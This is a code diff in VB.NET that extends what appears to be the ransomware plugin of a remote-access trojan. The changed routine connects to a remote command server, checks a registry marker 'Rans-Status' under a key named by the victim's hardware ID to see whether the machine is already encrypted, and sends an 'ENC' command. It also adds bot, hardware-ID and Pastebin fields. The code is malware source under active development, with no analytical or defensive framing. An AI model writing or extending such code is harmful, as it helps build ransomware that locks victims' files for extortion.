@@ -5,7 +5,7 @@ Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         KEY = K
         HOST = H
@@ -13,6 +13,10 @@ Public Class Main
         SPL = SP
         PASS = PW
         FULLPATH = FP
+        HWID = HW
+        BOT = BT
+        Pastebin = PB
+
         Dim lp As Integer = 0
 
         CN = False
@@ -36,6 +40,16 @@ Public Class Main
             lp = 0
             C.Client.Connect(H, P)
             CN = True
+            Try
+
+                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", Nothing)
+                If readValue = "Encrypted" Then
+                    Send("MSG" + SPL + "Error! " + "Already Encrypted!")
+                    CloseMe()
+                    Exit Sub
+                End If
+            Catch ex As Exception
+            End Try
             Send("ENC")
         Catch ex As Exception
         End Try
@@ -199,5 +213,8 @@ cc:
     Public Shared PASS As String
     Public Shared M As New IO.MemoryStream
     Public Shared FULLPATH As String
+    Public Shared HWID As String
+    Public Shared BOT As String
+    Public Shared Pastebin As String
 
 End Class
